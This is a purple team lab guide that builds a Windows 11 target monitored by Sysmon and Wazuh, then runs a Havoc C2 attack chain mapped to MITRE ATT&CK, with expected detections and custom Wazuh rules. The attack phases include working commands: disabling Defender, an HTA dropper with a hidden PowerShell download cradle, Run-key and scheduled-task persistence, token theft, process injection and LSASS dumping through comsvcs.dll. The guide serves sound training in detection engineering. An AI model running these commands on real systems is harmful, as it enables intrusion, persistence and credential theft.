# Purple Team Lab Exercise: ACE Interview Prep
## Full Attack Chain → Detection → Validation (Cobalt Strike-Style)

---

## Overview

This guide walks you through building a purple team exercise from scratch that directly maps to the purple team role requirements. You'll execute a realistic Cobalt Strike-style attack chain using Havoc C2 (closest open-source equivalent to Cobalt Strike), validate detections with Atomic Red Team and CALDERA, and analyze what Wazuh + Sysmon should catch at every step.

**ATT&CK Techniques Covered:**
| Phase | Technique | MITRE ID |
|-------|-----------|----------|
| Initial Access | Spearphishing Attachment | T1566.001 |
| Execution | PowerShell | T1059.001 |
| Execution | Windows Command Shell | T1059.003 |
| Persistence | Registry Run Keys | T1547.001 |
| Persistence | Scheduled Task | T1053.005 |
| Privilege Escalation | Token Impersonation | T1134.001 |
| Defense Evasion | Process Injection | T1055 |
| Credential Access | LSASS Memory Dump | T1003.001 |
| Discovery | System Info Discovery | T1082 |
| Discovery | Network Share Discovery | T1135 |
| Lateral Movement | Remote Services (SMB/PSExec) | T1021.002 |
| Command & Control | Encrypted Channel (HTTPS) | T1573.002 |
| Exfiltration | Exfil Over C2 Channel | T1041 |

---

## Phase 1: Lab Infrastructure Setup

### 1.1 Download the Windows 11 Enterprise Eval VM

**Source:** https://www.microsoft.com/en-us/evalcenter/download-windows-11-enterprise

- Download the **ISO** (not the pre-built VM — you want full control over configuration)
- The eval license is valid for **90 days** — plenty for this exercise
- File will be ~5-6 GB

### 1.2 Create the Windows 11 VM

#### If using Proxmox (recommended for your physical lab):

```bash
# Upload the ISO to Proxmox storage
# Then create the VM via the web UI or CLI:

qm create 200 \
  --name "win11-target" \
  --memory 8192 \
  --cores 4 \
  --net0 virtio,bridge=vmbr0,tag=<YOUR_TARGET_VLAN_ID> \
  --scsihw virtio-scsi-single \
  --scsi0 local-lvm:64,iothread=1 \
  --ide2 local:iso/Win11_Enterprise_Eval.iso,media=cdrom \
  --boot order=ide2 \
  --ostype win11 \
  --machine q35 \
  --bios ovmf \
  --efidisk0 local-lvm:1 \
  --tpmstate0 local-lvm:1,version=v2.0
```

**Critical Proxmox Settings for Win11:**
- Machine type: **q35** (required for Win11)
- BIOS: **OVMF (UEFI)** — Win11 requires UEFI
- TPM: **v2.0** — Win11 requires TPM
- CPU type: **host** (for best performance and compatibility)
- RAM: **8 GB minimum** (Win11 requirement is 4 GB but you want room for tools)
- Disk: **64 GB** minimum

#### If using VMware Workstation/ESXi:

```
- New VM → Windows 11 x64
- 8 GB RAM, 4 vCPU, 64 GB disk
- Enable "Encrypt access control" for TPM support
- Network: Set to the VLAN bridged to your target network segment
```

#### If using VirtualBox:

```
- New → Windows 11 (64-bit)
- Enable EFI
- 8 GB RAM, 4 cores
- Settings → System → Enable "Enable EFI"
- Settings → Security → Enable TPM 2.0
- Network → Bridged Adapter → Select your target VLAN interface
```

### 1.3 Install Windows 11

1. Boot from ISO
2. Select **Windows 11 Enterprise** edition
3. Do a **Custom (clean) install**
4. Create a local account (skip Microsoft account):
   - At the network screen, press **Shift + F10** → type `OOBE\BYPASSNRO` → Enter → VM restarts
   - Now select "I don't have internet" → "Continue with limited setup"
   - Username: `labuser` / Password: `<YOUR_LOCAL_ADMIN_PASSWORD>` (set during Windows install)
5. Decline all telemetry/Cortana options

### 1.4 Network Configuration

**Place this VM on your target/victim VLAN.** In your 7-VLAN architecture, this should be on a separate VLAN from your attack infrastructure.

Suggested VLAN layout for this exercise:
```
VLAN 10 (Attack)     → Kali box with Havoc/CALDERA/Sliver
VLAN 20 (Target)     → Windows 11 Enterprise target
VLAN 30 (Detection)  → Wazuh Manager, Security Onion
VLAN 40 (Management) → Your management/access workstation
```

**On the Windows 11 VM, set a static IP:**
```
Settings → Network & Internet → Ethernet → Edit
IP: 10.0.20.10 (adjust to your VLAN scheme)
Subnet: 255.255.255.0
Gateway: 10.0.20.1 (your pfSense VLAN gateway)
DNS: 10.0.20.1 (or your internal DNS)
```

**pfSense firewall rules needed:**
```
# Allow Attack VLAN → Target VLAN (for C2 and exploitation)
Source: VLAN10_net → Dest: VLAN20_net → Allow ALL
# (In production you'd restrict this, but for lab exercises open it up)

# Allow Target VLAN → Detection VLAN (for Wazuh agent comms)
Source: VLAN20_net → Dest: VLAN30_net → Port 1514/TCP, 1515/TCP → Allow

# Allow Target VLAN → Internet (for Windows updates initially)
Source: VLAN20_net → Dest: ANY → Allow
# (You may want to restrict/block this later to simulate an air-gapped env)
```

### 1.5 Disable/Weaken Windows Defender (Target Prep)

For learning purposes, you want to see attacks succeed first, then tune defenses. In a real engagement you'd test with Defender ON, but for initial setup:

```powershell
# Run PowerShell as Administrator on the Windows 11 target

# Disable Real-Time Protection (temporary — resets on reboot)
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable all Defender features for lab
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScriptScanning $true

# Disable Tamper Protection via registry (requires reboot)
# NOTE: Must first disable Tamper Protection in Windows Security GUI
# Settings → Windows Security → Virus & Threat → Manage Settings → Tamper Protection OFF
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f

# Disable Defender via Group Policy (persistent across reboots)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f

# Add exclusion for the entire C: drive (nuclear option for lab only)
Add-MpPreference -ExclusionPath "C:\"

# Disable Windows Firewall for all profiles (lab only)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# REBOOT to apply all changes
Restart-Computer
```

**After reboot, verify Defender is off:**
```powershell
Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableBehaviorMonitoring
# Both should show True
```

### 1.6 Install Sysmon (Critical for Detection)

Sysmon is the backbone of your endpoint telemetry. This is where your detection story starts.

**On the Windows 11 target:**

```powershell
# Download Sysmon
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "C:\Tools\Sysmon.zip"
Expand-Archive -Path "C:\Tools\Sysmon.zip" -DestinationPath "C:\Tools\Sysmon"

# Download the SwiftOnSecurity Sysmon config (industry standard baseline)
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "C:\Tools\Sysmon\sysmonconfig.xml"

# OR use Olaf Hartong's modular config (more comprehensive, better for purple teaming)
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml" -OutFile "C:\Tools\Sysmon\sysmonconfig.xml"

# Install Sysmon with the config
C:\Tools\Sysmon\Sysmon64.exe -accepteula -i C:\Tools\Sysmon\sysmonconfig.xml

# Verify Sysmon is running
Get-Service Sysmon64
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5
```

**Key Sysmon Event IDs you'll be looking for:**

| Event ID | What It Catches | Relevant Attack Phase |
|----------|----------------|----------------------|
| 1 | Process Creation | Execution, Discovery |
| 3 | Network Connection | C2 Communication |
| 7 | Image Loaded (DLL) | Defense Evasion |
| 8 | CreateRemoteThread | Process Injection |
| 10 | Process Access | Credential Dumping (LSASS) |
| 11 | File Created | Payload drops |
| 12/13 | Registry Events | Persistence |
| 15 | FileCreateStreamHash | ADS (Alternate Data Streams) |
| 22 | DNS Query | C2 Domain Resolution |
| 25 | Process Tampering | Defense Evasion |

### 1.7 Install Wazuh Agent on Target

```powershell
# Download Wazuh Agent (adjust version to match your Wazuh Manager)
Invoke-WebRequest -Uri "https://packages.wazuh.com/4.x/windows/wazuh-agent-4.9.0-1.msi" -OutFile "C:\Tools\wazuh-agent.msi"

# Install with your Wazuh Manager IP
msiexec.exe /i C:\Tools\wazuh-agent.msi /q WAZUH_MANAGER="<YOUR_WAZUH_MANAGER_IP>" WAZUH_REGISTRATION_SERVER="<YOUR_WAZUH_MANAGER_IP>"

# Start the agent
NET START Wazuh

# Verify agent is running and connected
& "C:\Program Files (x86)\ossec-agent\agent-auth.exe" -m <YOUR_WAZUH_MANAGER_IP>
```

**Configure Wazuh to ingest Sysmon logs — edit `C:\Program Files (x86)\ossec-agent\ossec.conf`:**

```xml
<!-- Add this inside the <ossec_config> block -->
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>

<!-- Also capture PowerShell logs -->
<localfile>
  <location>Microsoft-Windows-PowerShell/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>

<!-- Windows Security Event Log -->
<localfile>
  <location>Security</location>
  <log_format>eventchannel</log_format>
</localfile>

<!-- Windows System Event Log -->
<localfile>
  <location>System</location>
  <log_format>eventchannel</log_format>
</localfile>
```

**Restart the Wazuh agent:**
```powershell
Restart-Service WazuhSvc
```

### 1.8 Enable PowerShell Logging on Target

This is crucial — Cobalt Strike and Havoc both heavily use PowerShell. Without this, you're blind to most attack activity.

```powershell
# Enable Module Logging
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" /v "*" /t REG_SZ /d "*" /f

# Enable Script Block Logging (captures full PowerShell scripts)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f

# Enable Transcription Logging (saves PowerShell session transcripts to disk)
New-Item -Path "C:\PSTranscripts" -ItemType Directory -Force
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" /v EnableTranscripting /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" /v OutputDirectory /t REG_SZ /d "C:\PSTranscripts" /f
```

---

## Phase 2: Attack Infrastructure Setup

### 2.1 Kali Linux (Your Attack Box)

You already have Kali ready. Make sure it's on your **Attack VLAN** and can reach the Target VLAN.

```bash
# Verify connectivity to target
ping 10.0.20.10  # Your Windows target IP

# Update Kali
sudo apt update && sudo apt upgrade -y
```

### 2.2 Havoc C2 Framework (Cobalt Strike Clone)

Havoc is the closest open-source alternative to Cobalt Strike. Here's why it maps:

| Cobalt Strike | Havoc Equivalent |
|---------------|-----------------|
| Teamserver | Havoc Teamserver |
| Beacon | Demon Agent |
| Aggressor Scripts | Python/C++ Modules |
| BOFs (Beacon Object Files) | BOF Support (same format) |
| Sleep/Jitter | Sleep/Jitter on Demon |
| Malleable C2 Profiles | Listener Configuration |
| SMB Beacon | SMB Demon |

**Install Havoc on Kali:**

```bash
# Install dependencies
sudo apt install -y git build-essential apt-utils cmake libfontconfig1 \
  libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev \
  libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev \
  libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser \
  qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev \
  qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev \
  python3-dev libboost-all-dev mingw-w64 nasm

# Clone Havoc
cd /opt
sudo git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Build the teamserver
cd teamserver
go mod download golang.org/x/sys
go mod download github.com/ugorji/go
cd ..
make ts-build

# Build the client
make client-build
```

**Configure the Havoc Teamserver — create `/opt/Havoc/profiles/lab.yaotl`:**

```hcl
Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "operator" {
        Password = "<YOUR_HAVOC_PASSWORD>"
    }
}

# HTTPS Listener — this is your C2 channel
Listeners {
    Http {
        Name         = "HTTPS Listener"
        Hosts        = ["10.0.10.50"]  # Your Kali IP on Attack VLAN
        HostBind     = "0.0.0.0"
        HostRotation = "round-robin"
        PortBind     = 443
        PortConn     = 443
        Secure       = true
        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

        Uris = [
            "/api/v2/login",
            "/api/v2/content",
            "/api/v2/session"
        ]

        Headers = [
            "Content-type: application/json",
            "X-Api-Version: 2"
        ]

        Response {
            Headers = [
                "Content-type: application/json",
                "Server: Microsoft-IIS/10.0"
            ]
        }
    }
}

# Demon agent configuration
Demon {
    Sleep  = 5         # 5 second callback interval
    Jitter = 30        # 30% jitter (randomizes callback timing)

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn86 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}
```

**Start the Havoc Teamserver:**
```bash
cd /opt/Havoc
./havoc server --profile profiles/lab.yaotl -v
```

**Start the Havoc Client (in a new terminal):**
```bash
cd /opt/Havoc
./havoc client
```

Connect with:
- Name: `operator`
- Host: `127.0.0.1`
- Port: `40056`
- Password: `<YOUR_HAVOC_PASSWORD>`

### 2.3 Generate the Payload (Demon Agent)

In the Havoc Client GUI:
1. **Attack → Payload** (or Ctrl+P)
2. Configure:
   - Agent: **Demon**
   - Listener: **HTTPS Listener**
   - Arch: **x64**
   - Format: **Windows Exe** (for initial testing; use shellcode for evasion later)
   - Sleep: **5**
   - Jitter: **30**
3. Click **Generate**
4. Save as `update.exe` (innocuous name)

**Transfer to target** (simulate initial access):
```bash
# On Kali — start a simple HTTP server to host the payload
cd /path/to/payload/
python3 -m http.server 8080
```

### 2.4 Install Atomic Red Team on Target

Atomic Red Team gives you individual ATT&CK technique validation — perfect for the ASV portion of the interview.

**On the Windows 11 target (PowerShell as Admin):**

```powershell
# Set execution policy
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

# Install Atomic Red Team
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
Install-AtomicRedTeam -getAtomics

# Import the module
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force

# Verify it works
Invoke-AtomicTest T1082 -ShowDetails  # Should show System Information Discovery tests
```

### 2.5 CALDERA Setup (on Kali or separate VM)

CALDERA gives you automated adversary emulation with ATT&CK mapping — this is the closest analog to Mandiant Security Validation.

```bash
# On Kali (or a dedicated CALDERA VM on your Detection VLAN)
cd /opt
sudo git clone https://github.com/mitre/caldera.git --recursive
cd caldera

# Install requirements
pip3 install -r requirements.txt

# Start CALDERA
python3 server.py --insecure --build

# Default creds:
# Red team: admin / admin
# Blue team: blue / admin
# Access at: http://<KALI_IP>:8888
```

**Deploy CALDERA Agent (Sandcat) on the Windows target:**
```powershell
# On the Windows target — download and run the Sandcat agent
# Replace <CALDERA_IP> with your CALDERA server IP
$server="http://<CALDERA_IP>:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go-windows-amd64.exe");
$output="C:\Tools\splunkd.exe";
$wc.DownloadFile($url,$output);
Start-Process -FilePath $output -ArgumentList "-server $server -group red" -WindowStyle Hidden
```

---

## Phase 3: The Attack Chain (Cobalt Strike Style)

This simulates a realistic intrusion. Each step maps to MITRE ATT&CK and you'll document what Wazuh/Sysmon should detect.

### 3.1 Initial Access — T1566.001 Spearphishing Attachment

**What you're simulating:** A user opens a malicious document that downloads and executes your Havoc Demon payload.

**On Kali — create an HTA dropper (simulates a macro-enabled doc):**

```bash
# Create the HTA file that downloads and executes the Demon payload
cat << 'EOF' > /var/www/html/update.hta
<html>
<head>
<script language="VBScript">
  Sub RunPayload
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "powershell.exe -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://10.0.10.50:8080/stager.ps1')""", 0, False
    window.close
  End Sub
  RunPayload
</script>
</head>
<body>
<p>Loading document...</p>
</body>
</html>
EOF
```

**Create the PowerShell stager (`stager.ps1`):**
```powershell
# This downloads and executes the Havoc Demon payload
$url = "http://10.0.10.50:8080/update.exe"
$output = "$env:TEMP\update.exe"
(New-Object Net.WebClient).DownloadFile($url, $output)
Start-Process -FilePath $output -WindowStyle Hidden
```

**On the Windows target (simulating user clicking the phish):**
```powershell
# Simulate the user opening the HTA file
mshta http://10.0.10.50/update.hta
```

**🔍 What Wazuh/Sysmon Should Detect:**
```
Sysmon Event 1 (Process Create): mshta.exe spawning powershell.exe
  → Parent: mshta.exe
  → CommandLine: powershell.exe -nop -w hidden -c "IEX..."
  → This is a CLASSIC indicator — mshta spawning PowerShell is almost always malicious

Sysmon Event 3 (Network): powershell.exe connecting to 10.0.10.50:8080
  → Outbound connection from PowerShell = suspicious

Sysmon Event 11 (File Create): update.exe written to %TEMP%
  → New executable in temp directory

Sysmon Event 1 (Process Create): update.exe starting
  → Unknown binary executing from %TEMP%

Windows Event 4688: Process creation (if enabled)
PowerShell Script Block Log (4104): Full IEX download cradle captured

Wazuh Rules That Should Fire:
  → Rule 92000+: Sysmon process creation alerts
  → Rule 91500+: PowerShell suspicious activity
  → Custom rule: mshta.exe spawning cmd/powershell
```

### 3.2 Execution — T1059.001 PowerShell

Once the Demon agent calls back to Havoc, you have a session. Now execute discovery commands.

**In Havoc Client (interact with your Demon session):**
```
# In the Havoc console for your active Demon session:

demon >> shell whoami
demon >> shell hostname
demon >> shell ipconfig /all
demon >> shell net user
demon >> shell net localgroup Administrators
demon >> shell systeminfo
demon >> shell tasklist
demon >> shell net share
```

**🔍 What Wazuh/Sysmon Should Detect:**
```
Sysmon Event 1: cmd.exe spawned by update.exe (or injected process)
  → Each "shell" command spawns cmd.exe as a child of the Demon process
  → CommandLine contains discovery commands (whoami, systeminfo, net user, etc.)

Sysmon Event 1: Multiple rapid discovery commands
  → Burst of recon commands in short succession = automated enumeration

Windows Security Event 4688: Process creation audit trail
PowerShell 4104: If PowerShell is used instead of cmd

Wazuh Rules:
  → Enumeration detection rules
  → Suspicious parent-child process relationships
  → Rapid succession of discovery commands (custom rule needed)
```

### 3.3 Persistence — T1547.001 Registry Run Keys

**In Havoc:**
```
demon >> shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\labuser\AppData\Local\Temp\update.exe" /f
```

**Also test with Atomic Red Team on the target:**
```powershell
# Run the specific atomic test for Registry Run Keys
Invoke-AtomicTest T1547.001 -TestNumbers 1

# This will:
# - Add a registry key to HKLM\Software\Microsoft\Windows\CurrentVersion\Run
# - The key will point to a benign executable
# - Cleanup available with: Invoke-AtomicTest T1547.001 -TestNumbers 1 -Cleanup
```

**🔍 What Wazuh/Sysmon Should Detect:**
```
Sysmon Event 12/13 (Registry): Key created/modified at Run key path
  → TargetObject: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
  → Details: C:\Users\labuser\AppData\Local\Temp\update.exe

Windows Security Event 4657: Registry value modified (if auditing enabled)

Wazuh Rules:
  → Rule 92050+: Sysmon registry modification in Run keys
  → Custom rule: New value added to common persistence locations
  → HIGH severity — Run key modifications are almost always worth investigating
```

### 3.4 Persistence — T1053.005 Scheduled Task

**In Havoc:**
```
demon >> shell schtasks /create /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /tr "C:\Users\labuser\AppData\Local\Temp\update.exe" /sc onlogon /rl highest /f
```

**Atomic Red Team validation:**
```powershell
Invoke-AtomicTest T1053.005 -TestNumbers 1
```

**🔍 What Wazuh/Sysmon Should Detect:**
```
Sysmon Event 1: schtasks.exe process creation
  → CommandLine: schtasks /create /tn "Microsoft\Windows\..."
  → Parent process is suspicious (cmd.exe from C2)

Windows Security Event 4698: Scheduled task created
  → Task name, trigger, and action details captured

Windows Event Log (Task Scheduler): Task registered

Wazuh Rules:
  → Rule 60100+: New scheduled task created
  → Custom: Scheduled task pointing to executable in temp/user directories
```

### 3.5 Privilege Escalation — T1134.001 Token Impersonation

**In Havoc (if you have SeImpersonatePrivilege):**
```
demon >> whoami /priv
demon >> token list
demon >> token steal <PID_OF_SYSTEM_PROCESS>
demon >> whoami
```

**🔍 What Wazuh/Sysmon Should Detect:**
```
Sysmon Event 10 (Process Access): Your process accessing SYSTEM-level processes
  → SourceImage: update.exe
  → TargetImage: lsass.exe or winlogon.exe
  → GrantedAccess: Specific access mask indicating token theft

Windows Security Event 4672: Special privileges assigned to new logon
Windows Security Event 4624: New logon event (Type 9 = NewCredentials)

Wazuh Rules:
  → Privilege escalation detection
  → Process accessing sensitive system processes
```

### 3.6 Defense Evasion — T1055 Process Injection

**In Havoc:**
```
# Inject into a legitimate process to hide C2 traffic
demon >> proc list
demon >> inject <PID_OF_EXPLORER_OR_SVCHOST> x64 HTTPS_Listener
```

**Atomic Red Team validation:**
```powershell
# Test multiple injection techniques
Invoke-AtomicTest T1055.001  # DLL Injection
Invoke-AtomicTest T1055.002  # PE Injection
Invoke-AtomicTest T1055.003  # Thread Execution Hijacking
Invoke-AtomicTest T1055.012  # Process Hollowing
```

**🔍 What Wazuh/Sysmon Should Detect:**
```
Sysmon Event 8 (CreateRemoteThread):
  → SourceImage: update.exe (or current injected process)
  → TargetImage: explorer.exe / svchost.exe
  → THIS IS A HIGH-FIDELITY DETECTION — remote thread creation in
    system processes is almost always malicious

Sysmon Event 10 (Process Access):
  → Cross-process access with write permissions

Sysmon Event 7 (Image Loaded):
  → Unsigned DLL loaded into legitimate process

Wazuh Rules:
  → CreateRemoteThread detection (high severity)
  → Unsigned DLL loading in system processes
  → Process hollowing indicators
```

### 3.7 Credential Access — T1003.001 LSASS Memory Dump

This is the crown jewel of most intrusions — dumping credentials from LSASS.

**In Havoc:**
```
# Method 1: MiniDump via Havoc built-in
demon >> dotnet inline-execute /opt/tools/SharpDump.exe

# Method 2: Direct — using comsvcs.dll (living off the land)
demon >> shell rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\debug.dmp full

# Method 3: Task Manager method (manual for understanding)
demon >> shell tasklist /fi "imagename eq lsass.exe"
# Note the PID, then:
demon >> shell rundll32.exe comsvcs.dll MiniDump <PID> C:\temp\out.dmp full
```

**Atomic Red Team validation:**
```powershell
# Test LSASS dumping
Invoke-AtomicTest T1003.001 -TestNumbers 1  # Mimikatz-style
Invoke-AtomicTest T1003.001 -TestNumbers 2  # comsvcs.dll method
Invoke-AtomicTest T1003.001 -TestNumbers 6  # ProcDump

# Cleanup
Invoke-AtomicTest T1003.001 -TestNumbers 1,2,6 -Cleanup
```

**🔍 What Wazuh/Sysmon Should Detect:**
```
Sysmon Event 10 (Process Access): ACCESS TO LSASS.EXE
  → TargetImage: C:\Windows\System32\lsass.exe
  → GrantedAccess: 0x1010, 0x1410, or 0x1FFFFF
  → THIS IS YOUR HIGHEST-FIDELITY DETECTION
  → Any non-system process accessing LSASS with read permissions = ALERT

Sysmon Event 1: rundll32.exe with comsvcs.dll and MiniDump
  → CommandLine contains "comsvcs.dll" AND "MiniDump"

Sysmon Event 11 (File Create): .dmp file created
  → TargetFilename: *.dmp in unusual locations

Windows Security Event 4663: Object access to LSASS (if SACL configured)

Wazuh Rules:
  → LSASS access detection (CRITICAL severity)
  → comsvcs.dll MiniDump execution
  → Suspicious .dmp file creation
  → This should be an IMMEDIATE investigation trigger
```

### 3.8 Discovery — T1082 / T1135 System & Network Discovery

**In Havoc:**
```
demon >> shell systeminfo
demon >> shell net share
demon >> shell net view /domain
demon >> shell nltest /dclist:
demon >> shell net group "Domain Admins" /domain
demon >> shell arp -a
demon >> shell route print
demon >> shell netstat -ano
```

**CALDERA — run an automated discovery operation:**
1. In CALDERA web UI → **Operations** → **New Operation**
2. Select the **Discovery** adversary profile
3. Assign to your Sandcat agent on the Windows target
4. Click **Start** — CALDERA will chain discovery techniques automatically

**🔍 What Wazuh/Sysmon Should Detect:**
```
Sysmon Event 1: Multiple discovery commands in rapid succession
  → systeminfo, net view, nltest, net group — all from same parent process
  → This PATTERN is the indicator — individual commands may be benign,
    but 5-10 discovery commands in 30 seconds = automated enumeration

Wazuh Rules:
  → Burst detection: Multiple discovery-related events from same source in short window
  → This is where you'd write a CUSTOM Wazuh rule (great interview talking point)
```

### 3.9 Command & Control — T1573.002 Encrypted HTTPS C2

Your Havoc Demon is already using HTTPS C2. Here's what to look for:

**🔍 What Wazuh/Sysmon Should Detect:**
```
Sysmon Event 3 (Network Connection):
  → Outbound HTTPS connections from update.exe or injected process
  → Destination: Your Kali IP on port 443
  → REGULAR INTERVALS (every ~5 seconds with 30% jitter)
  → The regularity of beaconing is the detection key — even with jitter,
    C2 callbacks show patterns that differ from normal browsing

Sysmon Event 22 (DNS Query):
  → If using a domain instead of IP, DNS queries for C2 domain

Detection Strategy for Interview:
  → "I look for periodic outbound connections — even with jitter, C2 beacons
     create statistical patterns. A process making HTTPS calls every 3-7 seconds
     (5s ± 30%) is fundamentally different from a browser that makes bursty,
     irregular requests."
  → "I correlate network indicators with process lineage — if notepad.exe
     is making outbound HTTPS calls, that's a process injection indicator."
```

---

## Phase 4: Detection Validation & Wazuh Analysis

### 4.1 Wazuh Dashboard — What to Check

After running the attack chain, go to your Wazuh dashboard and look for:

```
1. Security Events → Filter by agent (your Windows target)
2. MITRE ATT&CK → You should see techniques light up on the matrix
3. Integrity Monitoring → Registry changes flagged
4. Vulnerability Detection → Any relevant CVEs on the target

Key Wazuh Rule IDs to look for:
  → 92000-92099: Sysmon process creation events
  → 92100-92199: Sysmon network events
  → 92200-92299: Sysmon file creation events
  → 92300-92399: Sysmon registry events
  → 91500-91599: PowerShell suspicious activity
  → 60100-60199: Windows scheduled tasks
```

### 4.2 Custom Wazuh Detection Rules

Here's where you differentiate yourself in the interview — show you don't just use defaults, you write custom detections.

**Custom rule: LSASS Access Detection**
```xml
<!-- Add to /var/ossec/etc/rules/local_rules.xml on Wazuh Manager -->
<group name="sysmon,credential_access,">

  <!-- Detect non-system processes accessing LSASS -->
  <rule id="100100" level="15">
    <if_sid>61612</if_sid>  <!-- Sysmon Event 10 - Process Access -->
    <field name="win.eventdata.targetImage" type="pcre2">(?i)\\\\lsass\\.exe$</field>
    <field name="win.eventdata.sourceImage" negate="yes" type="pcre2">(?i)(csrss|lsass|MsMpEng|wininit|svchost)\\.exe$</field>
    <description>CRITICAL: Non-system process accessed LSASS memory - T1003.001</description>
    <mitre>
      <id>T1003.001</id>
    </mitre>
    <group>credential_access,high_severity,</group>
  </rule>

  <!-- Detect comsvcs.dll MiniDump technique -->
  <rule id="100101" level="14">
    <if_sid>61603</if_sid>  <!-- Sysmon Event 1 - Process Create -->
    <field name="win.eventdata.commandLine" type="pcre2">(?i)comsvcs.*MiniDump</field>
    <description>Credential dumping via comsvcs.dll MiniDump - T1003.001</description>
    <mitre>
      <id>T1003.001</id>
    </mitre>
    <group>credential_access,</group>
  </rule>

</group>
```

**Custom rule: Process Injection Detection**
```xml
<group name="sysmon,defense_evasion,">

  <!-- Detect CreateRemoteThread injection -->
  <rule id="100200" level="14">
    <if_sid>61618</if_sid>  <!-- Sysmon Event 8 - CreateRemoteThread -->
    <field name="win.eventdata.targetImage" type="pcre2">(?i)(explorer|svchost|RuntimeBroker)\\.exe$</field>
    <description>Possible process injection via CreateRemoteThread - T1055</description>
    <mitre>
      <id>T1055</id>
    </mitre>
    <group>defense_evasion,</group>
  </rule>

</group>
```

**Custom rule: Persistence via Run Keys**
```xml
<group name="sysmon,persistence,">

  <!-- Detect new Run key entries pointing to temp directories -->
  <rule id="100300" level="12">
    <if_sid>61614</if_sid>  <!-- Sysmon Event 13 - Registry Value Set -->
    <field name="win.eventdata.targetObject" type="pcre2">(?i)\\\\Run\\\\</field>
    <field name="win.eventdata.details" type="pcre2">(?i)(Temp|AppData|Downloads)</field>
    <description>Persistence: Run key pointing to suspicious directory - T1547.001</description>
    <mitre>
      <id>T1547.001</id>
    </mitre>
    <group>persistence,</group>
  </rule>

</group>
```

**Custom rule: Beaconing Detection (C2)**
```xml
<group name="sysmon,command_and_control,">

  <!-- Detect suspicious process making outbound HTTPS connections -->
  <rule id="100400" level="10" frequency="5" timeframe="60">
    <if_matched_sid>61605</if_matched_sid>  <!-- Sysmon Event 3 - Network -->
    <field name="win.eventdata.destinationPort">443</field>
    <field name="win.eventdata.image" negate="yes" type="pcre2">(?i)(chrome|firefox|edge|teams|outlook|onedrive)\\.exe$</field>
    <description>Possible C2 beaconing: Non-browser making repeated HTTPS connections - T1573.002</description>
    <mitre>
      <id>T1573.002</id>
    </mitre>
    <group>command_and_control,</group>
  </rule>

</group>
```

**Apply the rules:**
```bash
# On your Wazuh Manager
sudo systemctl restart wazuh-manager

# Verify rules loaded
sudo /var/ossec/bin/wazuh-logtest
# Paste a sample Sysmon event to test rule matching
```

### 4.3 CALDERA for Automated Validation (ASV Equivalent)

This is the direct connection to the ACE role — CALDERA automates what Mandiant Security Validation does.

**Create a custom adversary profile in CALDERA:**
1. Go to **Adversaries** → **Create New**
2. Name it: "Purple Team - Detection Validation"
3. Add abilities in this order:
   - `System Information Discovery` (T1082)
   - `Account Discovery` (T1087)
   - `Registry Run Keys` (T1547.001)
   - `Scheduled Task` (T1053.005)
   - `LSASS Memory` (T1003.001)
   - `Process Injection` (T1055)
4. Run the operation against your Windows target
5. Review which techniques succeeded vs. which were detected

**Map results to your Wazuh detections:**
```
For each CALDERA technique that executed:
  ✅ Did Wazuh generate an alert?
  ✅ Was the alert the right severity?
